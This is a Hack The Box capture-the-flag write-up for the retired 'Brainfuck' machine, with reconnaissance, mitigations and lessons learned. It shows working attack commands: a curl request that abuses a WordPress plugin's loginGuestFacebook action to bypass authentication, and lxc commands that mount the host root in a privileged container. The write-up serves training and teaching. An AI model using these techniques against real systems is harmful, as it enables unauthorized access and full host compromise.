---
machine: Brainfuck
os: Linux
difficulty: Insane
platform: Hack The Box
state: Retired
tags: [linux, wordpress, authentication-bypass, vigenere, lxd]
---

# Brainfuck — Hack The Box (Linux)

**English** | [🇪🇸 Español](README.md)

> **Status:** Retired. Reference writeup; no real flags or credentials.

## TL;DR

The TLS certificate reveals the `brainfuck.htb` and `sup3rs3cr3t.brainfuck.htb` vhosts. WordPress runs WP Support Plus, vulnerable to an authentication bypass; as admin, `orestis`' mail is read and contains secret-forum credentials. The forum reveals a Vigenère key, the SSH password is decrypted and `orestis` is reached. The `lxd` group allows a privileged container that mounts the host.

## Reconnaissance

```bash
nmap -Pn -p- --min-rate 10000 <IP>
nmap -Pn -sCV -p<PORTS> <IP>
```

```text
22/tcp   ssh   OpenSSH 7.2p2 (Ubuntu)
25/tcp   smtp  Postfix
110/tcp  pop3  Dovecot
143/tcp  imap  Dovecot
443/tcp  https nginx 1.10.0
```

## Enumeration

- The certificate includes `www.brainfuck.htb` and `sup3rs3cr3t.brainfuck.htb`.
- `wpscan` identifies WP Support Plus < 8.0.0.
- The plugin allows logging in as any user through `loginGuestFacebook`.
- `orestis`' mail contains secret-forum credentials.

## Foothold

A request to `admin-ajax.php` with `action=loginGuestFacebook` and `username=admin` makes the plugin set an authentication cookie without validating the password.

As admin, mail is accessed and forum credentials are obtained. A Vigenère-encrypted message and its key recover `orestis`' SSH password.

```bash
curl -s -c cookies.txt -d 'username=admin&email=x&action=loginGuestFacebook'   http://brainfuck.htb/wp-admin/admin-ajax.php
```

## Lateral movement

The decrypted password provides SSH as `orestis`. Group enumeration shows membership in `lxd`.

```bash
ssh orestis@brainfuck.htb
id
lxc list
```

## Privilege escalation

A minimal Alpine image is imported, a privileged container is created and the host `/` is mounted at `/mnt`. From the container, the host filesystem is read and written as root.

```bash
lxc image import alpine.tar.gz --alias alpine
lxc init alpine privesc -c security.privileged=true
lxc config device add privesc hostroot disk source=/ path=/mnt/root
lxc start privesc
lxc exec privesc -- /bin/sh
```

## Evidence

- Trimmed output from key commands; no flags, credentials or tokens.
- Real values, when present, live in `private/` and are not published.

## Lessons learned

- The TLS certificate can reveal internal vhosts.
- A WordPress plugin can bypass all authentication.
- Classical cryptography is no substitute for a strong password.
- Membership in `lxd` is root-equivalent on many hosts.

## Mitigations and detection

- Update WP Support Plus and audit plugins.
- Do not reuse the mail password on forums.
- Use random passwords and a secret manager.
- Remove users from `lxd` and restrict privileged containers.

## References

- [0xdf — Brainfuck](https://0xdf.gitlab.io/2022/05/16/htb-brainfuck.html)
- [Video search (CSV)](https://www.youtube.com/results?search_query=ippsec+brainfuck)
- [Writeup search (CSV)](https://medium.com/search?q=hackthebox+brainfuck+writeup)
